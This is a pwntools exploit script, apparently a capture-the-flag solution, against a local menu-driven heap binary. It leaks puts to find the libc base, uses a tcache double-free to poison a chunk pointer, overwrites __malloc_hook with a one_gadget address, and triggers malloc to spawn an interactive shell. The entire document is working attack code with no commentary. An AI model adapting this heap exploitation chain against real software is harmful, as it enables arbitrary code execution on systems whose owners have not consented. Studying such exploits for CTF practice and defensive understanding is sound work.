from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
r=process('./init')
libc=ELF('./libc.so.6')

gdb.attach(r, 'b *0x4016fa')

heap_list=0x4040A0
def add(size, content):
    r.sendlineafter(b'Your choice: ', b'1')
    r.sendlineafter(b'Size: ', str(size))
    r.sendafter(b'Content: ', content)

def delete(idx):
    r.sendlineafter(b'Your choice: ', b'2')
    r.sendafter(b'Index: ', str(idx))

def edit(idx,content):
    r.sendlineafter(b'Your choice: ', b'3')
    r.sendafter(b'edit:', str(idx))
    r.recvuntil(b'content:')
    r.send(content)

def show(idx):
    r.sendlineafter(b'Your choice: ', b'4')
    r.sendafter(b'edit:', str(idx))

def leak():
    r.sendlineafter(b'Your choice: ', b'6')

r.recvuntil(b'0x')
puts_addr=int(r.recv(12),16)
log.success('puts_addr: ' + hex(puts_addr))
libc_base=puts_addr - libc.symbols['puts']
log.success('libc_base: ' + hex(libc_base))
malloc_hook=libc_base + libc.symbols['__malloc_hook']
ogg=[0x4f2be,0x4f2c5,0x4f322,0x10a38c]

add(0x20, b'a')
delete(0)
add(0x20, b'b')
delete(0)
edit(2, b'a')

add(0x20, b'a')
delete(0)
delete(0)
edit(0, p64(malloc_hook))
add(0x20, b'a')
add(0x20, p64(libc_base + ogg[3]))
r.sendlineafter(b'Your choice: ', b'1')
r.sendlineafter(b'Size: ', b'1')
r.interactive()